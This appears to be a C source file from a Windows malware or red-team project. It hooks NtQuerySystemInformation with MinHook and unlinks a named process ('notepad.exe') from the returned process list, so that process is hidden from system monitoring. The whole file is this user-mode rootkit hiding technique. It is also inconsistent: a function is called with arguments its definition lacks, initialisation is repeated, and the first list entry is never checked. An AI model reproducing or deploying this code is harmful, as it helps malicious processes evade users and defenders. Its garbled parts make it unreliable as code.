#include <Windows.h>
#include <stdio.h>
#include "structs.h"
#include "ApiHashing.h"
#include "common.h"
#include "Hooks.h"
#include "vanWin.h"
#include "TypeDef.h"
#include "MinHook.h"
#include <Shlwapi.h>


fnNtQuerySystemInformation originalNtQuery;
fnNtQuerySystemInformation newNtQuery;

VOID InitHooks() {

    MH_Initialize();
    InstallHook("NtQuerySystemInformation", &originalNtQuery, &hookedNtQuery, &newNtQuery);

}

NTSTATUS WINAPI hookedNtQuery(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) {
    NTSTATUS stat = newNtQuery(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);


    if (SystemInformationClass == SystemProcessInformation && stat == 0) {

        PSYSTEM_PROCESS_INFORMATION prev = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
        PSYSTEM_PROCESS_INFORMATION curr = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)prev + prev->NextEntryOffset);

        while (TRUE) {

            if (StringCompareA(curr->ImageName.Buffer, "notepad.exe")) {
                prev->NextEntryOffset += curr->NextEntryOffset;
                curr = prev;
            }

            if (!curr->NextEntryOffset)
                break;

            prev = curr;
            curr = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)curr + curr->NextEntryOffset);
        }
    }
    return stat;
}


BOOL InstallHook() {

    originalNtQuery = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");

    if (MH_Initialize() != MH_OK) {
        return FALSE;
    }
    
    if (MH_CreateHook(originalNtQuery, &hookedNtQuery, &newNtQuery) != MH_OK) {
        return FALSE;
    }

    if (MH_EnableHook(originalNtQuery) != MH_OK) {
        return FALSE;
    }

    return TRUE;
}

BOOL UnHook() {

    if (MH_DisableHook(originalNtQuery) != MH_OK) {
        return FALSE;
    }

    if (MH_Uninitialize() != MH_OK) {
        return FALSE;
    }

    return TRUE;
}